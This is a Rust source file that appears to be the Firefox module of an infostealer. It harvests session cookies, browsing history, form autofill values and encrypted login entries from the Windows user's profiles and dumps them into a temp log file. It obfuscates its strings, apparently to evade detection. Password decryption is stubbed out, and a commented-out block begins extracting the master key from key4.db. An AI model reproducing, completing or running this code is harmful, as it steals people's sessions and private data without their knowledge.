use anyhow::{Result, Context, bail};
use serde_json::Value;
use rusqlite::{Connection, params};

use crate::obfuscate;

struct Firefox {
    key_path      : String, 
    login_data    : String, 
    history_data  : String,
    autofill_data : String,
    cookies_data  : String,
}


pub fn dump()-> Result<String> {

    let user = std::env::var("USERNAME")?;
    let mut log = String::new();

    let profiles = match paths(&user) {
        Ok(profiles) => profiles,
        Err(e) => {
            log.push_str(&format!("{e}"));
            return Ok(log);
        }
    };

    for profile in profiles {

        // Deriving the master key
        //let key = derive_master_key(profile.key_path)?;

        log += &obfuscate!("\n#### Login Data ####\n");
        match get_login_data(profile.login_data) {
            Ok(data) => log.push_str(&data),
            Err(e) => {
                log += &obfuscate!("\nFailed to get login data: ");
                log += &format!("{e}");
            },
        };
        
        log += &obfuscate!("\n#### Cookies ####\n");
        match get_cookies_data(profile.cookies_data) {
            Ok(data) => log.push_str(&data),
            Err(e) => {
                log += &obfuscate!("\nFailed to get cookies: ");
                log += &format!("{e}"); 
            }
        }

        log += &obfuscate!("\n\n#### History ####\n\n");
        match get_history_data(profile.history_data) {
            Ok(data) => log.push_str(&data),
            Err(e) => {
                log += &obfuscate!("\nFailed to get history data : ");
                log += &format!("{e}");
            } 
        };

        log += &obfuscate!("\n\n#### Autofills ####\n");
        match get_autofill_data(profile.autofill_data) {
            Ok(data) => log.push_str(&data),
            Err(e) => {
                log += &obfuscate!("\nFailed to get autofill data : ");
                log += &format!("{e}");
            }
        };  
    }

    let name = "firefox.log";
    let temp_path = std::env::temp_dir().join(name);
    std::fs::write(&temp_path, &log)?;

    Ok(temp_path.to_string_lossy().to_string())
}


fn paths(user: &str) -> Result<Vec<Firefox>> {

    let profiles_path = format!("C:\\Users\\{}{}", user, obfuscate!("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"));
    let profiles_dir = std::fs::read_dir(&profiles_path)?;

    let mut profiles_config: Vec<Firefox> = Vec::new();
    for entry in profiles_dir {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() && path.to_string_lossy().contains("release") {
            profiles_config.push(Firefox{
                key_path      : format!("{}\\{}", path.to_string_lossy(), obfuscate!("key4.db")), 
                login_data    : format!("{}\\{}", path.to_string_lossy(), obfuscate!("logins.json")), 
                history_data  : format!("{}\\{}", path.to_string_lossy(), obfuscate!("places.sqlite")),
                autofill_data : format!("{}\\{}", path.to_string_lossy(), obfuscate!("formhistory.sqlite")),
                cookies_data  : format!("{}\\{}", path.to_string_lossy(), obfuscate!("cookies.sqlite")),
            });
        }
    }

    Ok(profiles_config)
}


fn get_login_data(login_data: String) -> Result<String> {

    let logins_json = std::fs::read_to_string(login_data)?;
    let parsed: Value = serde_json::from_str(&logins_json)?;

    let mut data = String::new();
    data += &obfuscate!("\nURL \t Username \t Password");
    data += "\n--- \t -------- \t --------";

    if let Some(logins) = parsed["logins"].as_array(){
        for login in logins {
            let host = login["hostname"].as_str().unwrap_or("Invalid");
            let encrypted_usr  = login["encryptedUsername"].as_str().unwrap_or("Invalid");
            let encrypted_pass = login["encryptedPassword"].as_str().unwrap_or("Invalid");

            match decrypt_data(encrypted_usr, encrypted_pass) {
                Ok(_) => {},//data.push_str(&format!("\n{} \t {} \t {}", host, usr, pass)),
                Err(e) => data += &format!("{}", e),
            };

        }
    }

    Ok(data)
}



fn get_cookies_data(cookies_data: String) -> Result<String> {
    let name = "cookies";
    let cookies_temp_path = std::env::temp_dir().join(name);
                    
    if let Err(e) = std::fs::copy(cookies_data, &cookies_temp_path) {
        let err = format!("{}{e}", obfuscate!("Failed to copy cookies database: "));
        bail!(err);          
    };

    let cookies_data_path = cookies_temp_path.to_str().context("Failed to convert path")?;
    let conn = Connection::open(cookies_data_path)?;

    let query: &str = &obfuscate!("SELECT host, name, value FROM moz_cookies;");
    let mut stmt = conn.prepare(query)?;

    let rows = stmt.query_map(params![], |row| {
        let hkey: String = row.get(0)?;
        let name: String = row.get(1)?;
        let value: String = row.get(2)?;
        Ok((hkey, name, value))
    })?;

    let mut cookies = Vec::new();
    for row in rows {
        cookies.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    for (hkey, name, cookie) in cookies {
        data.push_str(&format!("\n{} \t {} \t {}", hkey, name, cookie));
    }

    Ok(data)
}


fn get_history_data(history_data: String) -> Result<String> {
    let name = "history";
    let history_temp_path = std::env::temp_dir().join(name);
                    
    if let Err(e) = std::fs::copy(history_data, &history_temp_path) {
        let err = format!("{}{e}", obfuscate!("Failed to copy history database: "));
        bail!(err);          
    };

    let history_data_path = history_temp_path.to_str().context("Failed to convert path")?;
    let conn = Connection::open(history_data_path)?;

    let query : &str = &obfuscate!("SELECT url FROM moz_places");
    let mut stmt = conn.prepare(query)?;
    
    let rows = stmt.query_map(params![], |row| {
        let url: String = row.get(0)?;
        Ok(url)
    })?;

    let mut history = Vec::new();
    for row in rows {
        history.push(row.context("Failed to read row")?);
    }
    let mut data = String::new();
    for h in history {
        data += &h;
        data += "\n";
    }
    Ok(data)
}

fn get_autofill_data(history_data: String) -> Result<String> {
    let name = "autofill";
    let history_temp_path = std::env::temp_dir().join(name);
                    
    if let Err(e) = std::fs::copy(history_data, &history_temp_path) {
        let err = format!("{}{e}", obfuscate!("Failed to copy cookies database: "));
        bail!(err);          
    };

    let history_data_path = history_temp_path.to_str().context("Failed to convert path")?;
    let conn = Connection::open(history_data_path)?;
    let query: &str = &obfuscate!("SELECT fieldname, value FROM moz_formhistory");
    let mut stmt = conn.prepare(query)?;
    
    let rows = stmt.query_map(params![], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        Ok((name, value))
    })?;

    let mut fills = Vec::new();
    for row in rows {
        fills.push(row.context("Failed to read row")?);
    }

    let mut data = String::new();
    data += &obfuscate!("\nName \t Value");
    data += "\n---- \t -----"; 

    for (name, value) in fills {
        data += &format!("\n{} \t {}", name, value)
    }
    Ok(data)
}


fn decrypt_data(encrypted_username: &str, encrypted_password: &str) -> Result<()> {
    let e = obfuscate!("\nFirefox decryption isn't currently supported :(\n");
    bail!(e);
    Ok(())
}



/*



fn derive_master_key(key_path: String) -> Result<Vec<u8>> {
    let name = "key";
    let key_temp_path = std::env::temp_dir().join(name);
                    
    if let Err(e) = std::fs::copy(key_path, &key_temp_path) {
        bail!("Failed to copy key4.db database: {}\n", e);          
    };

    let key_data_path = key_temp_path.to_str().context("Failed to convert database path")?;
    let conn = Connection::open(key_data_path).context("Failed to open database")?;

    // Global salt
    let mut stmt = conn.prepare("SELECT item1 FROM metadata WHERE id = 'password'")
        .context("Failed retrieve global salt")?;

    let rows = stmt.query_map(params![], |row| {
        let item: Vec<u8> = row.get(0)?;
        Ok(item)
    }).context("Failed to query database")?;

    let mut global_salt = Vec::new();
    for row in rows {
        global_salt.push(row.context("Failed to read row")?);
    } 

    // nssPrivate

    let mut stmt = conn.prepare("SELECT a11 FROM nssPrivate;")
        .context("Failed retrieve nssPrivate")?;

    let rows = stmt.query_map(params![], |row| {
        let item: Vec<u8> = row.get(0)?;
        Ok(item)
    }).context("Failed to query database")?;

    let mut nss_private_blob = Vec::new();
    for row in rows {
        nss_private_blob.push(row.context("Failed to read row")?);
        break;
    }

    let master = Vec::new();

    Ok(master)
}


*/